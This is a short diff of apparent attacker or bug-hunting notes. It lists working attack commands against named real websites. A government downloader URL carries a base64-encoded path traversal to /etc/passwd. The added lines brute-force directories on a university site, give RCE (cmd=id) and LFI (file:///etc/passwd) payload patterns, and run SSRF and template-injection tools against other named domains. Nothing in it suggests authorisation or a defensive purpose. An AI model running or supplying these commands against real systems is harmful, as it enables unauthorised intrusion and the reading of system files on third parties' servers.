@@ -14,7 +14,14 @@ Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
 
 https://www.dsckohat.gov.pk/downloader/downloadFileForce.php?fileName=NzAwOTIzMTAxMF9BcHBsaWNhdGlvbl9mb3JtXzIwMjUucGRm&filePath=Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
 
+dirb https://sksc.somaiya.edu/ -X .php
+ffuf -w /usr/share/wordlists/dirbcommon.txt -u https://sksc.somaiya.edu/download.php?FUZZ -mc 200 -fr "Erro Message"
 
+.php?cmd=id (RCE)
+?pdf_path=file:///etc/passwd (LFI)
+
+python3 ssrfmap.py -r request.txt -m readfiles -p "pdf_path"   ( make sure to remove cookie)
+python3 sstimap.py -u "https://www.ycode.com/experts?name=test&services[]="
 
 
 
